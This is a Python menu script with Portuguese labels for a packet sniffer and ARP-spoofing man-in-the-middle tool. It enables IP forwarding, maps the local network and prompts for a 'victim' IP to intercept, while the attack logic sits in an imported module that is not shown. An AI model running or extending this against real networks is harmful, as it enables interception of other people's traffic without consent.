import socket
import struct #faz o unpack da data para bytes
import time
import textwrap #texto bonito
import shutil
from scapy.all import *
import sys, os, time
from uuid import getnode as get_mac
from termcolor import colored
import threading
from cabledolphinbrain import sniffer
from cabledolphinbrain import homemdomeio
os.system("clear")

sniff=sniffer()
mitm=homemdomeio()
def menu():
    os.system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward")
    opc = ""
    while True:
        try:
            os.system("clear")
            print("\t\t[+] ------------------------SNIFFER-------------------------- [+]")
            print("\t\t[+]                                                           [+]")
            print("\t\t[+]   			 1-SNIFFA REDE/ ARP                   [+]")
            print("\t\t[+]   			 2-SNIFF MYSELF                       [+]")
            print("\t\t[+]   		         0-Sair                               [+]")
            print("\t\t[+]                                                           [+]")
            print("\t\t[+]-----------------------------------------------------------[+]")
            opc = input("\t\t[Option] >> ")
            if opc == "2":
                sniff.imprimeframe()
            elif opc == "0":
                os.system("clear")
                sys.exit(1)
            elif opc == "1":
                os.system("clear")
                while True:
                    #os.system("clear")
                    print(" [+]------------ARP----------[+]")
                    print(" [+]        1-NETWORK        [+]")
                    print(" [+]        2-IP             [+]")
                    print(" [+]        0-VOLTAR         [+]")
                    print(" [+]-------------------------[+]")

                    opc = input(" [insere opcao] >> ")
                    if opc == "0":
                        os.system("clear")
                        break
                    elif opc == "2":
                        os.system("clear")
                        prefix = "192.168.100."
                        VIPadd = input("[+] ip da vitima: 192.168.100.")
                        VIPadd = prefix.replace("\n","") + VIPadd.replace("\n","")
                        gateway = prefix.replace("\n","") + ("1")
                        mitm.mitm(VIPadd)
                    elif opc == "1":
                        os.system("clear")
                        mitm.mapnet()
                    else:
                        os.system("clear")
                        print(colored(" [!] INVALID INPUT [!]",'red'))

        except KeyboardInterrupt:
            opc=input("Sair? [y/n]")
            if opc.lower() == "y":
                break
            else:
                print(" [!] Exiting...")
                print(" [!] Shutdown!")
                os.system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")
                sys.exit(1)

menu()
